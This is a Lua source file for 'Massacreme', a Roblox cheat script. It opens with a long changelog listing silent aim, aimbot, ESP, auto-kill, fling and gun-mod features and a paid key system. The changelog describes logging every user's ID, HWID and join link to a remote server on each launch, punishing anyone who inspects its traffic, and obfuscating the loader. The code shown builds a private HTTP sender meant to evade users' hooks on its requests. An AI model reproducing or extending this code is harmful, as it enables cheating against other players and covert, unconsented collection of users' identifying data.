--[[
    ╔══════════════════════════════════════════════════════════════════╗
    ║                 MASSACREME  –  UI Lib Edition                    ║
    ║                        By Brian & Bob                            ║
    ║                                                                  ║
    ║  Tabs: Player · ESP · Aimbot · Quests · MISC · Guns · Viewer     ║
    ║         Settings · Credits                                       ║
    ║  Toggle:  RightShift                                             ║
    ╚══════════════════════════════════════════════════════════════════╝

    CHANGELOG
    ─────────────────────────────────────────────────────────────────
    4/11/2026 — session 21 (Bob)
      -- temporarily removed executor support thing
      -- fixed false positives on potassium and other executors in anti-spy
      
    4/6/2026 — session 20 (Brian)
      -- moved Discord webhook logging fully server-side: _LOG_HOOK now points to
           Railway /log endpoint instead of Discord directly; Railway proxies the
           embed to Discord so the webhook URL never exists in the client script
      -- removed _PROTECTED_URLS table and _isProtectedUrl() — table was leaking
           the webhook URL in plaintext via getgc() scan; both branches of the
           ncHandler already called originals[method] so the table was dead code;
           simplified ncHandler to a single return
      -- added execution log: fires in its own task.spawn coroutine before the key
           screen IIFE, logs username, user ID, HWID, executor, game, and join link
           to the /log endpoint on every script launch
      -- updated punishment() spy detection log: now includes HWID and user ID
           alongside username in the embed sent to the log channel; HWID is
           computed inline (same algorithm as _getHWID) since punishment() is
           defined before _getHWID in the file

    4/6/2026 — session 19 (Bob)
      -- fixed anti http-spy false-positive on Xeno and other low-support executors:
       replaced bare `antispySupported = HttpPost ~= nil` with a full capability
       probe — verifies that newcclosure produces a real C closure AND that
       hookmetamethod returns the previous handler before enabling the detection
       block; executors that fail either check now skip anti-spy entirely instead
       of instantly triggering punishment
      -- added punishment for http loggers, further organized parts of the script
      -- added function support check for unsupported executors
      -- added re-execution cleanup block at the very top of live code:
           destroys all owned GUIs (key screen, main panel, FAB, quickbar,
           hit notif, target HUD, CMDS panel, player panel) from any previous
           run before creating new ones; disconnects all stored RunService/UIS
           connections via getgenv().__massacreme_conns so duplicate Heartbeat,
           Stepped, and RenderStepped loops can't stack; resets __antispy_loaded
           so the namecall hook reinstalls cleanly; clears leftover Drawing objects
           (ESP circles, tracers, silent aim FOV ring); yields one frame to let
           Roblox GC destroyed instances before init; result: re-executing the
           script is now fully idempotent — no broken character, no doubled speed,
           no duplicate ESP, no stacked GUI frames
      -- added anti http-spy ** WIP

    3/25/2026 — session 18 (Bob)
      -- fixed proximity prompt instant interact bug

    3/24/2026 — session 17 (Bob)
      -- fixed auto knife self-enabling on knife equip
      -- added juggernaut priority alongside killer in viewer tab
      -- color picker popups disappear when scrolling
      -- finally fixed padding on labels and buttons in the gui 
      -- added search bar for use emotes in misc tab
      -- added discord username to discord webhook logger ** WIP
      -- converted utc time to edt time on discord webhook logger
      -- added different health colour types to player labels
      -- added device type to discord webhook logger

    3/22/2026 — session 16 (Bob)
      -- adapted scroll frames to massacreme mobile ui scaling
      -- added player labels size slider + saved in config table
      -- attempt to fix silent aim on mobile using screen center **
      -- fixed discord webhook logger's avatar url again
      -- organized script functions and other stuff a bit
      -- fixed Player Labels not showing for some players
      -- added keybinds to saved config table
      -- changed/removed/replaced ui lib labels on Massacreme
      -- added Team Check and Visible Check toggle to Aimbot tab
      -- added Player Labels toggle to ESP tab (below Player Outlines)
           shows team, distance, HP, and username for each player
           
    3/20/2026 — session 15 (Bob)
      -- reduced mobile UI scale multipliers: vp.X * 0.95 -> 0.86,
           vp.Y * 0.88 -> 0.80 so the panel fits smaller screens
      -- content frame now has PaddingLeft/PaddingRight of UDim(0.005, 0)
           so all tab content renders at ~0.99 width instead of flush
           against the scroll frame edges; avoids touching UILib row sizing
      -- tabScroller canvas padding now conditional on _isMobile: +140 on
           mobile (extra scroll room for the wider tab bar), +10 on PC
           (was hardcoded to 140 for both)
      -- added _gcSupported flag: one-time probe at startup checks that
           getgc exists and returns a real table; if not, _sgM() and
           startAutoReload() return immediately and flip their cfg flags
           off instead of crashing mid-Heartbeat on executors that don't
           support getgc (e.g. Fluxus, some mobile executors); a
           UILib.notify() tells the user why the feature didn't activate
      -- guarded auto-restore block (task.defer on load): cfg.GunModEnabled
           and cfg.AutoReloadEnabled saved from a previous session are now
           cleared to false instead of calling _sgM/_sgAutoReload blindly
           when _gcSupported is false, preventing a silent crash on first
           load after switching executors
      -- reduced mobile UI scale multipliers: vp.X * 0.95 -> 0.40,
           vp.Y * 0.88 -> 0.325 so the panel fits smaller screens

    3/16/2026 — session 14 (Brian & Bob)
      -- mobile support: after key sign-in a platform selector appears with
           "PC" and "Mobile" buttons; auto-detects TouchEnabled and pre-highlights
           the correct option; _isMobile flag drives all mobile-only code paths
      -- mobile FAB: draggable floating "M" button (bottom-right); tap to open
           main GUI; drag uses UserInputService.InputChanged (global, not button-
           local) so fast drags no longer lose tracking; button stays green always,
           brief brightness pulse on tap instead of turning red
      -- mobile quickbar: pinnable feature bar anchored top-center; drag locked
           to X-axis only (Y fixed at 8px from top); max width cap prevents
           overflow on small screens; auto-sizes to fit pinned button count
      -- quickbar picker panel: "+" button opens a horizontally-scrolling chip
           panel above the bar listing all pinnable features; picker shortened
           (height capped); max width cap added; "-" replaces box-rendering
           Unicode close char
      -- quickbar button state indicators: replaced Unicode "filled circle" (●)
           and "empty circle" (○) — both rendered as boxes in Roblox — with
           ASCII "*" (on) and "." (off); picker pin chips already used "[+]"/"[ ]"
           ASCII so were unaffected
      -- QB_ALL cfgKey fixes: corrected key mismatches that caused toggles to do
           nothing: "PlayerESPEnabled" -> "ESPEnabled",
           "AntiAFK" -> "AntiAFKEnabled", "Fullbright" -> "FullbrightEnabled",
           "AutoBiteEnabled" -> "BiteEnabled"
      -- _rIC forward declaration: changed "local function _rIC()" to
           "local _rIC" forward-decl + "_rIC = function()" assignment so the
           collect quickbar closure captures the correct upvalue instead of nil
      -- _getPackets forward declaration: same fix applied — "local function
           _getPackets()" was shadowing the forward-decl at line ~2183, causing
           nil crash in the auto-bite loop; changed to assignment form
      -- removed duplicate UILib.registerKeybind for AutoCollectToggle: the
           keybindRow call already registers it internally; the extra explicit
           registerKeybind was overwriting the callback with a different one
      -- obfuscation guidance (lura.ph): Intense VM Structure OFF (causes
           silent crash in Velocity — executor globals not accessible inside
           lura.ph VM sandbox), Use Debug Library OFF, Hardcode Globals OFF,
           Level 1 optimization; obfuscate only the loadstring wrapper so the
           main script on GitHub can be updated freely without re-obfuscating
      -- loadstring wrapper: script delivered as
           loadstring(game:HttpGet("RAW_GITHUB_URL"))() — raw URL points to
           the unobfuscated Massacremeb.lua on the serv branch
      -- work.ink / DNS migration: free key flow moved to www.massacreme.shop
           (Hostinger CNAME record pointing to Railway); work.ink strips query
           params so token-in-URL was replaced with cookie-based session
           (masa_session) stored at /start with IP binding and 8-hour per-IP
           cooldown; /getkey validates IP + session cookie before issuing key

    3/16/2026 — session 13 (Brian)
      -- webhook now shows key duration: server /verify response now includes
           a human-readable label (e.g. "8 Hours (Free)", "7 Days (Weekly)",
           "30 Days (Monthly)", "Lifetime"); _verifyOnline returns it as 4th
           value keyLabel; _sendLog adds a Duration field to the embed
      -- free (8h) keys no longer require Discord /redeemkey: server /verify
           now auto-redeems any key with durationHours <= 8 or a work.ink
           free key (has expiresAt but no durationHours) on first verify;
           keys above 8h (weekly, monthly, lifetime) still require the user
           to run /redeemkey in Discord before the key activates

    3/16/2026 — session 12 (Brian)
      -- removed auto-verify saved key on load: was causing webhook to fire
           silently on every script execution before user manually signed in,
           resulting in confusing "Free User" logs; key still pre-fills in the
           box from saved file so user only needs to click Sign In once

    3/16/2026 — session 11 (Brian)
      -- fixed webhook logging lifetime keys as "Free User": /verify only
           returned { ok, message } with no tier info so the client had no
           way to distinguish a permanent key from a regular one; server now
           returns permanent: true/false in the response; _verifyOnline now
           returns a 3rd value isPermanent; both call sites (manual sign-in
           and auto-load) pass isPermanent and "Lifetime" or "Whitelisted"
           to _sendLog; embed title and colour updated: ♾️ Lifetime Key
           (gold), ✅ Whitelisted (green), 🔓 Free User (amber); also fixed
           "Whitelisted-AutoLoad" not matching the old exact == "Whitelisted"
           check so auto-load sign-ins were always logged as Free User too
      -- fixed auto knife needing manual re-enable every round: CharacterAdded
           called _sKA() 0.5 s after spawn (before knife arrives) so
           knifeSwingConn was set but findKnife() returned nil the whole
           time; when knife arrived later ChildAdded saw knifeSwingConn was
           already set and skipped the restart; fix: watcher always calls
           _xKA() then _sKA() when knife arrives regardless of loop state,
           plus 1 s fallback poll that restarts loop if KnifeEnabled is on
           but knifeSwingConn is nil and knife is present (catches all
           timing edge cases including knife arriving before watcher hooks)

    3/16/2026 — session 10 (Brian)
      -- merged all session 8 features from Massacreme11 into this file:
           auto-verify saved key on load (skips key screen if valid key saved),
           settings persistence (_saveCfg/_loadCfg to massacreme_cfg.txt,
           autosaved every 5 s, loaded on startup so all toggles/sliders
           restore to last values), _getPackets forward-declaration (stopped
           the line 1962 "attempt to call nil value" crash in the bite loop),
           knife fallback poll (1 s Heartbeat restarts _sKA if KnifeEnabled
           but loop isn't running — catches every timing edge case),
           knife watcher hook delay reduced 0.5 s → 0.1 s
      -- fixed auto reload burst: guns were stopping after every reload and
           requiring manual MB1 re-click because the old _tapR sent MB1 UP
           then MB1 DOWN with only a 50 ms gap — if reload wasn't done in
           50 ms the re-press was ignored, gun never resumed; fix: removed
           the MB1 UP entirely, increased wait before re-press to 0.25 s,
           gun now seamlessly continues firing after reload with no burst

    3/16/2026 — session 9 (Bob)
      -- fixed "IsMouseButtonDown is not a valid member of UserInputService":
           UIS.IsMouseButtonDown doesn't exist in Roblox's API; replaced with
           UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)
      -- fixed fullbright causing "error in error handling" spam from
           ReplicatedStorage.Modules.Utility.LightingManager: the L.Changed
           hook was reacting to every Ambient/OutdoorAmbient change with
           task.defer, creating a tight fight with the game's LightingManager
           ApplyPreset/renderEffect pipeline that errored mid-render; replaced
           with a RunService.Heartbeat loop polling every 0.5s to re-apply
           Color3.new(1,1,1) — no longer reacts to every lighting event
      -- fixed instant interact HoldDuration not reverting: now saves
           origHoldDur before patching and restores it after firing
      -- fixed proximity prompt CoreScript crash (attempt to index userdata
           with 'Play'): added task.wait() between HoldDuration=0 and
           fireproximityprompt so CoreScript processes the duration change
           before we fire, preventing its animation track from being accessed
           before initialization

    3/15/2026 — session 8 (Brian)
      -- key screen: removed free vs premium feature table, replaced with a
           single "LIFETIME – What you get" perks card (6 bullet points)
      -- key screen: removed "Continue without Key", "Get Lifetime Key", and
           "Get a Free Key" buttons; combined into one "Get Key" button that
           copies the Discord link; panel shrunk to fit
      -- key screen: "Sign In with Premium Key" renamed to "Sign In with Key"
           since free keys exist; placeholder text updated to "Enter your key..."
      -- key screen: ClearTextOnFocus set to false on key input box so text
           doesn't wipe when user clicks the box
      -- gun mods off now actually reverts: _xgM() was only stopping the
           Heartbeat loop but leaving all patched values in memory;
           _gM() now saves originals into _gmOriginals / _gmGlobalOrig before
           the first patch; _xgM() restores every field and clears both tables
           so the next enable/disable cycle starts fresh
      -- emote selector index persists across tab switches: emoteIndex was a
           local inside the render function so it reset to 1 every time the tab
           was re-opened; hoisted to module-scope _emoteIdxCache so your
           selection stays until you manually change it or hit Rescan
      -- auto reload now uses dual method: VIM R key tap + direct
           Packets.startReload + Packets.reload every 0.4 s while holding a gun;
           gun detection also falls back to name patterns (ak, rifle, pistol…)
           in case GetAttribute("Gun") hasn't replicated yet
      -- auto reload re-click gated on user input: the MB1 release+repress that
           restarts auto-fire after reload now checks
           UIS:IsMouseButtonPressed(MouseButton1) first — if the user has let go,
           the repress is skipped so the gun stops shooting as expected
      -- auto knife re-enables on new round: knife watcher now also restarts
           _sKA() when cfg.KnifeEnabled is already true but knifeSwingConn is
           nil (i.e. player got a fresh knife at round start); no more needing
           to toggle off and back on manually
      -- auto bite added (separate from auto knife):
           • cfg.BiteEnabled toggle — independent of KnifeEnabled
           • auto-equips BITE tool via EquipTool + direct parent assign, skips
             one frame to let equip settle before firing
           • targets nearest player carrying a gun (survivors only)
           • fires via VirtualUser Button1Down/Up to trigger tool's own
             Activated handler, plus direct Packets.useItem:Fire("Bite",{})
             as backup — same dual approach as knife
           • 1500 ms cooldown matching the real BITE script
           • reuses KNIFE.SIDE_OFF / BACK_OFF / VERT_OFF offsets
           • watcher auto-starts loop when BITE tool is given (no zombie mode
             detection needed — just checks cfg.BiteEnabled + tool presence)
           • "Auto Bite Attack" toggle added in UI below "Auto Knife Attack"
      -- _G.Testing was accidentally left true; flipped to false so Discord
           webhook logging works again on key sign-in
      -- MagazineSize removed from gun mod patches so the server tracks real
           ammo and shots actually register

    3/15/2026 — session 7 (Bob)
      -- fixed gun mods not reverting on disable: _xgM() only disconnected the 
          Heartbeat but never restored original values; added _gmOriginals table 
          that saves every field's original value before first patch via _gmSave(); 
          _xgM() now iterates _gmOriginals and writes them back, then clears the 
            table so a fresh enable/disable cycle saves new originals cleanly
      -- replaced trigger bot entirely: scrapped the old Heartbeat + raycast +
           VirtualUser approach; new implementation uses RenderStepped +
           Mouse.Target + mouse1click()/mouse1release() — fires when Mouse.Target
           has a Humanoid parent; removed TRIGGER_RATE from _AUTO, removed fire
           interval slider from UI; toggle + keybind (H) remain
      -- FOV Circle Color now also applies to Show Silent Aim Target square
      -- fixed Visible Check not working: _saIsVisible was calling
           Camera:GetPartsObscuringTarget() via __index which re-entered UILib's
           hook and returned garbage; fixed by caching Camera.GetPartsObscuringTarget
           as _saRawGetObscuring before any hooks run and calling it as
           _saRawGetObscuring(Camera, ...) — same raw-ref pattern applied to
           Camera.WorldToScreenPoint (_saRawWorldToScreen) and
           Camera.WorldToViewportPoint (_saRawWorldToViewport)
      -- added FOV Circle Color picker (cfg.SA_FOVColor, default blue);
           color updates every RenderStepped on the Drawing object
      -- fuh old silent aim; port of Universal Silent Aim integrated into Guns tab:
           • Enabled toggle, Team Check, Visible Check
           • Target Part cycle row: HumanoidRootPart / Head / Random
           • SA Method cycle row: Raycast / FindPartOnRay /
             FindPartOnRayWithWhitelist / FindPartOnRayWithIgnoreList /
             Mouse.Hit/Target
           • Hit Chance slider (0–100%)
           • Mouse.Hit/Target Prediction toggle + Prediction Amount slider
           • Show FOV Circle toggle + FOV Radius slider + FOV Circle Color picker
           • Show Silent Aim Target toggle (dot on screen at locked target)

    3/14/2026 — session 6 (Brian)
      -- SILENT AIM BREAKS THE GUN: when silent aim is enabled the gun stops
           shooting entirely — unknown root cause, but auto knife confirmed
           working fine with silent aim OFF; silent aim is the problem.
           Bob needs to investigate why the __namecall / __index hooks conflict
           with the gun's fire logic; suspected cause is the Raycast redirect
           returning a bad RaycastResult (nil or wrong instance) that the gun's
           server packet then rejects, preventing any shot from going through;
           possible fix: only apply the hook while the aim-lock target is valid
           and the local weapon is not the active tool, or check that the
           redirected ray still hits a valid BasePart before returning it

      -- CMDS SYSTEM — summary of all changes this session:
           • removed /goto  /tp  /spectate  from command parser (cluttered, rarely
             useful from a whitelisted friend; cleaner to keep it action-focused)
           • added /push: 8 rapid teleport+velocity bursts through the target;
             relies on physics collision to force them away; no item needed
           • fixed CMDS commands not firing: SkidFling, doPipeHit, startPepperAuto
             were forward-referenced locals defined AFTER _execCmdMsg — Lua treated
             them as globals (nil) at call time; added explicit forward-decl block
             (local SkidFling, doPipeHit, ...) so assignments propagate correctly
           • fixed isKnivesOut() nil crash (lines 1504 & 1661): same forward-ref
             issue — isKnivesOut is defined at ~line 3613 but called deep inside
             the knife block; added local isKnivesOut forward-decl before the knife
             section; this was crashing _isKOCached() and the KO auto-start watcher
             every Heartbeat, which is also likely why auto knife didn't work
           • private chat support: CMDS now also hooks TextChatService.OnIncomingMessage
             so whitelisted players can send commands via DM/whisper — still checks
             the sender username against the whitelist before acting
           • no-item reply: if a whitelisted player sends /pipe or /spray and you
             don't have the tool equipped or in backpack, your client sends
             "Sorry, I dont have that item - MASSACREME-CMDS" back to them
           • /w confirmation toggle added to the CMDS panel (ON by default):
             when ON, every successful command fires a confirmation back to the
             sender — SEE KNOWN ISSUE BELOW about /w not working
           • pepper spray auto now teleports to target (was only rotating to face
             them): if distance > 4 studs, teleports to 2.5 studs in front of
             target while maintaining local Y so the character lands on the ground;
             under 4 studs it just faces the target as before
           • changed close button in CMDS panel from emoji X to plain "X" text
             (emoji rendered as a block character in-game font)

      -- KNOWN ISSUE — /w confirmation does not work:
           TextChatService channel:SendAsync("/w Username text") does NOT trigger
           the whisper command in Roblox's new chat system — the slash prefix is
           sent as a literal message, not parsed as a command; the confirmation
           PM toggle is wired up in the panel and the call is in the code but
           it silently does nothing right now
           Bob to investigate: options are (1) find the private TextChannel object
           for the sender directly via TextChatService.TextChannels and call
           SendAsync() on THAT channel (no /w prefix needed, already private),
           or (2) use the legacy Chatted service via game:GetService("Chat"):Chat()
           if available, or (3) just print a local notification instead of a PM

      -- CMDS — ideas Bob might want to add later:
           • /follow <name>  — auto-walk toward the whitelisted player's target
               using Humanoid:MoveTo() loop; useful if they're leading you somewhere
           • /kill <name>    — queue the named player for auto knife (adds to
               knifeQueue so the existing knife system handles it)
           • /stop           — cancel any running auto action (stops pepper, pipe
               loop, knife queue) — useful panic command
           • /here           — teleport the CMDS operator to your position instead
               of the other way around (reverse of a goto)
           • persistent whitelist — currently resets on script reload; could save
               to a JSON file or _G table so it survives between runs

    3/14/2026 — session 5 (Brian)
      -- fixed auto reload breaking gun: previous approach reset ammo to max every
           0.15 s regardless of current ammo level; Massacre's gun compares
           prevBullets > bullets after each shot to gate the muzzle flash — constant
           reset made that comparison always fail → animation played, no flash, shot
           suppressed; fix: only refill when counter reaches 0 (refillIfEmpty),
           so the gun fires and shows all effects normally until truly empty

    3/14/2026 — session 4 (Bob)
      -- fixed viewer popup destroying on tab switch: removed the p:Destroy() call
           from the viewer Heartbeat cleanup block so the mini player panel stays
           open when switching away from the Viewer tab
      -- replaced speed system: CFrame WASD manual key-check loop replaced with
           TranslateBy(hum.MoveDirection * cfg.Speed * dt) — uses the humanoid's
           actual move direction so it works with all control schemes and feels
           more natural; no UserInputService polling needed
      -- fixed quest proximity prompts: now saves and restores HoldDuration, 
           MaxActivationDistance, Enabled, and RequiresLineOfSight via task.defer
      -- replaced Instant Interact proximity prompt system: old HoldDuration=0
           hook removed; now uses ProximityPromptService.PromptButtonHoldBegan to
           fireproximityprompt() the moment the player begins holding — shows
           notif if executor lacks fireproximityprompt
      -- added Aim Lock keybind (default J) with keybindRow in Aimbot tab;
           registered via UILib.registerKeybind so it dispatches correctly;
           syncs toggle visual on press
      -- added emote scan blacklist: scanEmotes() now filters out internal
           remote/event names (remoteevent, getservers, emotesdata, emotes, emoteui,
           emote, quickjoin, playemote, joinspecific, hitboxclassremote, etc)
           so the emote picker only shows actual playable emotes
      -- added Third Person toggle in Settings tab → Utility section: saves original
           CameraMinZoomDistance / CameraMaxZoomDistance / CameraMode on enable,
           enforces classic third-person every RenderStepped frame so games can't
           override it; restores originals on disable
      -- added Show Playerlist toggle in Settings tab → Utility section: forces
           SetCoreGuiEnabled(PlayerList, true) and disables avatar context menu
           every RenderStepped frame; restores on disable
      -- added _G.Testing flag: set to true to suppress all Discord webhook calls; 
           _sendLog returns early and prints to console instead; defaults to false
      -- fixed Discord webhook join link: changed roblox:// deep-link to
           https://www.roblox.com/games/<placeId>?gameInstanceId=<serverId>
           so Discord renders it as a clickable hyperlink instead of plain text
      -- updated webhook avatar_url: changed private GitHub raw link to the
           Discord server logo URL so the webhook bot icon actually shows up

    3/13/2026 — session 3 (Brian)
      -- added Discord webhook logger (_sendLog): fires on key verify success and
           free-continue; logs username, display name, user ID, account age,
           executor, team, used key, HWID, game name/place ID, server ID,
           timestamp, and any leaderstats (wins/coins/etc.); fire-and-forget
           via task.spawn so it never blocks or errors the user
      -- removed local bypass key (PROJECTV1) — all auth goes through Railway
      -- integrated Railway key system (Massacreme_KeySystem.lua latest version):
           shows premium key screen on load with animated starfield, feature table,
           Discord invite banner; verifies key via POST /verify on the Railway server
           (HWID-bound); local bypass key "PROJECTV1"; saves key to massacreme_key.txt;
           "Continue without Key" skips verification and loads the full UI;
           "Get a Free Key" copies discord.gg/aDUjgCDbRj to clipboard;
           "Exit" destroys the screen and aborts script load
      -- removed Knife Range slider and applyKnifeRange() — server-side range
           attribute can't be patched reliably from the client; removed entirely
      -- reverted pipe hit: back to original single-swing approach — teleport
           2.5 studs behind target, Scriptable cam, one VirtualUser click
      -- fixed auto knife heartbeat: removed premature return after knifeEquip;
           knife equip now uses dual method (EquipTool + direct parent assign)
           so teleport always fires on the same tick, no more infinite equip loop
      -- fixed auto knife no-targets bail: heartbeat no longer calls _xKA() when
           queue is temporarily empty — keeps running so targets are caught when
           they spawn in (e.g. early in round before all players load)
      -- added KO auto-start watcher: when a knife tool is added to character
           during a Knives Out round, automatically enables Auto Knife Attack
           (cfg.KnifeEnabled = true) and calls _sKA() — no manual toggle needed

    3/13/2026 — session 2 (Brian)
      -- fixed auto reload: Massacre has no reload RemoteEvent (binary packet system)
           now patches bullets=∞ and ammo=MagazineSize every 0.15 s via getgc()
           also handles currentAmmo / CurrentAmmo / Bullets variants
      -- fixed silent aim: was a no-op stub; now uses hookmetamethod on __namecall
           to redirect workspace:Raycast() direction at getClosestPlayer() target
           also hooks __index to redirect Mouse.Hit/Target at closest enemy
           hooks set up once at init, enabled/disabled via cfg.SilentAimEnabled
      -- fixed auto knife glitch: was using FindFirstChild("Knife") exact name so
           ghost face / skin-named knives were never found and loop got stuck;
           now uses findKnife() (pattern-based) everywhere in the swing loop
      -- fixed auto knife equip logic: now checks if knife is already in character
           before calling knifeEquip, skips one tick instead of always-returning
      -- fixed KO mode isKnivesOut() call in _kRQ: result is now cached 10 s to
           avoid expensive getgc() scan on every Heartbeat tick
      -- fixed pipe hit: was single attempt with camera-type swap (unreliable);
           now fires 3 swings in rapid succession — each swing fires both
           specialAttack packet (Packets getgc) AND VirtualUser click, teleports
           to 1.5 studs behind target instead of 2.5 (inside melee range)
      -- removed Knives Out Detector UI section (Check button) from MISC tab;
           KO mode is detected automatically by the knife targeting logic
      -- added Stop button to Use Emote — stops _activeEmoteTrack immediately
      -- added Emote Speed slider (0.1–5.0) — AdjustSpeed on active track

    3/13/2026 — session 1 (Brian)
      -- added Fullbright map-spawn fix
           kills Lighting.BlackOutAtm directly AND nested under Blackout
           hooks workspace.ChildAdded so every new map spawn re-nukes it
           also hooks the inner Map child in case round re-uses Map folder
      -- added Auto Redeem Codes button in MISC (fires all 4 codes at once:
           10mil / ghost / 12kmembers / 100kfavorites via Packets getgc)
      -- added Knives Out Detector in MISC (Check button + gamemode label)
      -- added Use Emote section in MISC (Prev/Next cycle + Use/Rescan)
           emote playback uses local Animator:LoadAnimation so it actually works
           also tries Packets.emote:Fire() for server-side visibility
      -- added Knife Range (studs) slider in Player tab → Auto Knife section
           patches knife tool Range attribute + GunClient config via getgc
      -- fixed Knives Out knife targeting: in KO mode all non-local players
           are queued regardless of team (previously nobody was targeted)
      -- fixed getGameMode() — now searches workspace descendants, workspace
           attributes directly, all ReplicatedStorage descendants, and getgc()
           tables; shows actual mode string or "KO / Ghost Face / etc."
      -- fixed fireEmote() — now scans character Animate script for the
           animation ID and plays it via Animator:LoadAnimation, with hardcoded
           fallback IDs for Wave/Dance/Cheer/Laugh/Point/Dance2/Dance3/Salute
      -- fixed _rIC() collect-all: applies Bob's ESP sense check so items with
           Transparency >= 1 (already picked up / held) are skipped entirely,
           no more wasting time teleporting to empty spots
      -- fixed Collect All button in item teleport list: same sense check applied
--]]

-- ══════════════════════════════════════════════════════════════════════
-- EXECUTOR COMPAT SHIM + RE-EXECUTION CLEANUP
-- ══════════════════════════════════════════════════════════════════════
--[[
do
    -- Stubs
    local _id, _noop, _false, _nil, _empty =
        function(...) return ... end,
        function() end,
        function() return false end,
        function() return nil end,
        function() return {} end

    if not getgenv          then getgenv          = function() return _G end end
    if not islclosure       then islclosure        = _false  end
    if not iscclosure       then iscclosure        = _false  end
    if not isourclosure     then isourclosure      = _false  end
    if not clonefunction    then clonefunction     = _id     end
    if not newcclosure      then newcclosure       = _id     end
    if not hookfunction     then hookfunction      = function(orig) return orig end end
    if not hookmetamethod   then hookmetamethod    = function() return nil end end
    if not getrawmetatable  then getrawmetatable   = getmetatable end
    if not setreadonly      then setreadonly        = _noop   end
    if not getnamecallmethod then getnamecallmethod = function() return "" end end
    if not getgc            then getgc             = _empty  end
    if not getupvalues      then getupvalues        = _empty  end
    if not getupvalue       then getupvalue         = _nil    end
    if not getoriginalfunction then getoriginalfunction = _id end
    if not identifyexecutor then identifyexecutor  = function() return "Unknown" end end
    if not getexecutorname  then getexecutorname   = function() return "Unknown" end end

    -- request fallback
    if not request and not http_request and not (syn and syn.request) and not (http and http.request) then
        local ok, fn = pcall(function()
            local HS = game:GetService("HttpService")
            return function(opts) return HS:RequestAsync(opts) end
        end)
        if ok and fn then request = fn end
    end

    -- Drawing stub
    if not Drawing then
        Drawing = { new = function()
            return setmetatable({}, { __index = function() return function() end end, __newindex = function() end })
        end }
    end
end
--]]

do
    -- Destroy GUIs from previous run
    for _, name in ipairs({
        "MP_Loader", "Massacreme_UILib", "Massacreme_FAB", "Massacreme_Quickbar",
        "_MasaHitNotif", "MP_TargetHUD", "_MasacreCMDS", "_MasacrePanel", "MP_TipTicker",
    }) do
        pcall(function()
            for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
                if g.Name == name then g:Destroy() end
            end
        end)
        pcall(function()
            local pg = game:GetService("Players").LocalPlayer:FindFirstChildOfClass("PlayerGui")
            if pg then
                for _, g in ipairs(pg:GetChildren()) do
                    if g.Name == name then g:Destroy() end
                end
            end
        end)
    end

    -- Disconnect stored connections
    local prev = getgenv().__massacreme_conns
    if prev then for _, c in ipairs(prev) do pcall(function() c:Disconnect() end) end end
    getgenv().__massacreme_conns = {}
    getgenv().__antispy_loaded   = nil

    -- Clear leftover Drawing objects
    pcall(function()
        local ok, gc = pcall(getgc)
        if ok and type(gc) == "table" then
            for _, v in next, gc do
                if type(v) == "userdata" then
                    pcall(function() v.Visible = false; v:Remove() end)
                end
            end
        end
    end)

    local _tw = task and task.wait
    if _tw then _tw(0) else wait(0) end
end

-- ══════════════════════════════════════════════════════════════════════
-- ANTI HTTP-SPY SYSTEM — detects and recovers from hooks on HTTP methods used by
-- common spyware modules; logs detections and restores original functions to
-- their original state
-- ══════════════════════════════════════════════════════════════════════

-- ══════════════════════════════════════════════════════════════════════
-- VAULT: execution-order-proof private HTTP sender
--
-- Problem: clonefunction(request) still routes through __namecall and
-- getgenv() globals — if another script hooked those before or after us,
-- every clone shares the same interception point.
--
-- Solution: reach past __namecall entirely.
--   1. rawget the game metatable to pull RequestAsync's real C closure
--      before hookmetamethod has any effect on it.
--   2. Bind it to HttpService with a newcclosure so it is our private
--      function object — no global name, no __namecall dispatch.
--   3. Store it ONLY as a local upvalue (not in getgenv) so external
--      scripts can't find or replace it.
--   4. Fall back to executor globals (request / http_request / syn.request)
--      only if the rawget path fails, but still recover via upvalue walk
--      in case those are already hooked.
-- ══════════════════════════════════════════════════════════════════════
local __HS_vault  = game:GetService("HttpService")
local __vaultSend  -- the private, unhookable send function

do
    -- Step 1: grab RequestAsync directly from the raw metatable, bypassing __namecall
    local _rawReqAsync
    pcall(function()
        local mt = getrawmetatable(game)
        local nc = rawget(mt, "__namecall")
        -- rawget on the metatable gives us the C closure before any hookmetamethod layer
        -- We call it with the method name baked in via a newcclosure wrapper
        if nc and iscclosure(nc) then
            -- Build a direct caller: set namecall method then invoke the raw __namecall
            _rawReqAsync = newcclosure(function(opts)
                -- Use the raw __index path to get RequestAsync as a C closure
                local ok, fn = pcall(function()
                    return rawget(getrawmetatable(__HS_vault), "__index")
                end)
                if ok and fn then
                    local mok, method = pcall(fn, __HS_vault, "RequestAsync")
                    if mok and method and iscclosure(method) then
                        return method(__HS_vault, opts)
                    end
                end
                return nil
            end)
        end
    end)

    -- Step 2: also try grabbing RequestAsync directly via __index on the metatable
    -- This is the cleanest path: bypasses __namecall completely
    local _directReqAsync
    pcall(function()
        local mt  = getrawmetatable(__HS_vault)
        local idx = rawget(mt, "__index")
        if idx then
            local ok, fn = pcall(idx, __HS_vault, "RequestAsync")
            if ok and fn and iscclosure(fn) then
                -- Bind HttpService into the closure so callers just pass opts
                _directReqAsync = newcclosure(function(opts)
                    return fn(__HS_vault, opts)
                end)
            end
        end
    end)

    -- Step 3: clone executor globals NOW (before any other script in this
    -- coroutine can yield and let a spy hook in)
    if not getgenv().__cleanFns then
        getgenv().__cleanFns = {}
        pcall(function() if request        then getgenv().__cleanFns.request          = clonefunction(request)        end end)
        pcall(function() if http_request   then getgenv().__cleanFns.http_request     = clonefunction(http_request)   end end)
        pcall(function() if http and http.request then getgenv().__cleanFns.http_dot_request = clonefunction(http.request) end end)
        pcall(function() if syn and syn.request   then getgenv().__cleanFns.syn_request      = clonefunction(syn.request)  end end)
    end

    -- Step 4: pick the best sender in priority order
    --   a) rawget __index path   — immune to __namecall hooks entirely
    --   b) __namecall raw path   — immune to hookmetamethod (less reliable)
    --   c) cloned executor global — immune to post-load hooks on the global
    --   d) live executor global   — last resort, may be hooked
    local function _resolveGlobal(fn)
        if not fn then return nil end
        if iscclosure(fn) then return fn end
        -- it's an lclosure (hooked) — try to recover the original C closure
        local ok, orig = pcall(function() return getoriginalfunction(fn) end)
        if ok and orig and iscclosure(orig) then return orig end
        for i = 1, 20 do
            local ok2, a, b = pcall(debug.getupvalue, fn, i)
            if not ok2 then break end
            local v = (b ~= nil) and b or a
            if type(v) == "function" and iscclosure(v) then return v end
        end
        return nil
    end

    local _cf = getgenv().__cleanFns or {}
    __vaultSend = _directReqAsync
                  or _rawReqAsync
                  or _resolveGlobal(_cf.request)
                  or _resolveGlobal(_cf.http_request)
